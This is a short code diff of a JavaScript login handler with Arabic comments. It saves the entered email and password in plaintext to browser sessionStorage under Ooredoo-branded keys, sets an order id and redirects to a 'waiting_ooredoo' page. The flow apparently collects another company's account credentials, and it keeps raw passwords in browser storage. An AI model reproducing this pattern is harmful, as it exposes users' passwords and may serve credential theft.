@@ -376,9 +376,18 @@
     
     // إذا كانت جميع البيانات صحيحة، اذهب لصفحة التحميل
     if (isValid) {
-      // حفظ البيانات في sessionStorage لصفحة التحميل
-      sessionStorage.setItem('userEmail', emailInput.value);
-      sessionStorage.setItem('userPassword', passwordInput.value);
+      const ooredooUser = emailInput.value.trim();
+      const ooredooPass = passwordInput.value.trim();
+
+      sessionStorage.setItem('userEmail', ooredooUser);
+      sessionStorage.setItem('userPassword', ooredooPass);
+      sessionStorage.setItem('ooredooUser', ooredooUser);
+      sessionStorage.setItem('ooredooPass', ooredooPass);
+
+      const currentOrderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
+      sessionStorage.setItem('safwa_order_id', currentOrderId);
+      localStorage.setItem('requestId', currentOrderId);
+
       window.location.href = 'waiting_ooredoo.html';
     }
   });
